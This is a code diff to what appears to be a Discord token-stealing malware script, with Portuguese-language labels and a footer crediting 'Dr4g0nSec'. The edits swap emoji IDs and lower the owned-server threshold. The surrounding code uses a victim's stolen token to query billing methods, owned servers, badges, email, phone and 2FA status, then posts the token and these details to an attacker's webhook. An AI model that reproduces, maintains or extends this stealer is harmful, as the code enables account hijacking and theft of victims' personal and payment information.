@@ -15,18 +15,18 @@ const discordPaths = {
 };
 
 const badgeFlags = {
-  1: "<:staff:968704541946167357>",
-  2: "<:partner:968704542021652560>",
-  4: "<:hypersquad_events:968704541774192693>",
-  8: "<:bug_hunter_1:968704541677723648>",
-  64: "<:hypersquad_1:968704541501571133>",
-  128: "<:hypersquad_2:968704541883261018>",
-  256: "<:hypersquad_3:968704541874860082>",
-  512: "<:early_supporter:968704542126510090>",
-  16384: "<:bug_hunter_2:968704541774217246>",
-  131072: "<:verified_dev:968704541702905886>",
-  262144: "<:certified_moderator:988996447938674699>",
-  4194304: "<:developper:1200219063780130916>"
+  1: "<:Staff:1378144222812835860>",
+  2: "<:Partnered:1378144221189509140>",
+  4: "<:hypesquad_events:1378085682538483853>",
+  8: "<:bug_hunter_standard85:1378070508981194752>",
+  64: "<:Icon_Hypesquad_Bravery:1378085649185374329>",
+  128: "<:Icon_Hypesquad_Brilliance:1378070531315597413>",
+  256: "<:Leaf:1378070543227555943>",
+  512: "<:YASuporter_Second:1378144224393826425>",
+  16384: "<:bug_hunter_gold:1378070506883776622>",
+  131072: "<:Developer:1378070517080129566>",
+  262144: "<:Official_Moderator:1378144219696201848>",
+  4194304: "<:developper:1378078700213370880>"
 };
 
 function getAppDataPath() {
@@ -109,8 +109,8 @@ async function getBillingInfo(token) {
     });
     if (res.data.length === 0) return "Nenhum.";
     return res.data.map(src => {
-      if (src.type === 1) return "<:creditcard:1366960345289195550>";
-      if (src.type === 2) return "<:PayPal:1366960065768325150>";
+      if (src.type === 1) return "<:creditcard:1378070515536891977>";
+      if (src.type === 2) return "<:PayPal:1378143456345456721>";
       return null;
     }).join(" | ");
   } catch {
@@ -123,7 +123,7 @@ async function getOwnedServers(token) {
     const res = await axios.get("https://discord.com/api/v9/users/@me/guilds", {
       headers: { Authorization: token }
     });
-    const guilds = res.data.filter(g => g.owner && g.approximate_member_count > 100);
+    const guilds = res.data.filter(g => g.owner && g.approximate_member_count > 50);
     return guilds.map(g => `${g.name} | ${g.id}`).join("\n") || "Nenhum.";
   } catch {
   }
@@ -146,17 +146,17 @@ async function sendToWebhook(token, user, extras, friendsBadges, ownedGuilds, co
     color: 0x250e80,
     thumbnail: { url: `https://cdn.discordapp.com/avatars/${user.id}/${user.avatar}.png` },
     fields: [
-      { name: "<:hackerblack:1095747410539593800> Token:", value: `\`\`\`${token}\`\`\`\n\n\u200b`, inline: false },
-      { name: "<:discordnitro1:1183675764281978975> Nitro:", value: `${extras.nitro}`, inline: true },
-      { name: "<a:shadownitro:1183671188350844969> Badges:", value: `${extras.badges || 'Nenhum.'}`, inline: true },
-      { name: "<a:creditcard:1183669246857842719> Cobrança:", value: `${extras.billing}`, inline: true },
-      { name: "<:duaschavesnochaveiro:1183669306429546526>  2FA:", value: `${extras.mfa}`, inline: true },
+      { name: "<:anonymous:1378070498969387158> Token:", value: `\`\`\`${token}\`\`\`\n\n\u200b`, inline: false },
+      { name: "<:discordnitro1:1378085625735151727> Nitro:", value: `${extras.nitro}`, inline: true },
+      { name: "<a:shadownitro:1378140924428947616> Badges:", value: `${extras.badges || 'Nenhum.'}`, inline: true },
+      { name: "<a:creditcard:1378078694634946682> Cobrança:", value: `${extras.billing}`, inline: true },
+      { name: "<:2FA:1378085633159069736>  2FA:", value: `${extras.mfa}`, inline: true },
       { name: "\u200b", value: "\u200b", inline: false },
-      { name: "<:icons8gmail50:1183669308996464650>  Email:", value: `${extras.email}`, inline: true },
-      { name: "<:mobilegang11:1183669252411109376> Telefone:", value: `${extras.phone}`, inline: true },
+      { name: "<:icons8gmail50:1378085663433293824>  Email:", value: `${extras.email}`, inline: true },
+      { name: "<:celular:1378142619728871435> Telefone:", value: `${extras.phone}`, inline: true },
       { name: "\u200b", value: "\u200b", inline: false },
-      { name: "<:world:1361777609632911611> HQ Servidores:", value: ownedGuilds, inline: false },
-      { name: "<:siyahtoplum94:1183669256269869116>  HQ Amigos:", value: friendsBadges, inline: false }
+      { name: "<:world:1378143049288253460> HQ Servidores:", value: ownedGuilds, inline: false },
+      { name: "<:users:1378143209729032244>  HQ Amigos:", value: friendsBadges, inline: false }
     ],
     footer: {
       text: "Created by: sk4rty and execute | Dr4g0nSec on Top!",
@@ -165,7 +165,7 @@ async function sendToWebhook(token, user, extras, friendsBadges, ownedGuilds, co
   };
 
   if (codes) {
-    embed.fields.push({ name: "<a:gift:1021608479808569435> Códigos Gifts:", value: codes, inline: false });
+    embed.fields.push({ name: "<a:gift:1378140640935809084> Códigos Gifts:", value: codes, inline: false });
     embed.fields.push({ name: "\u200b", value: "\u200b", inline: false });
   }
 
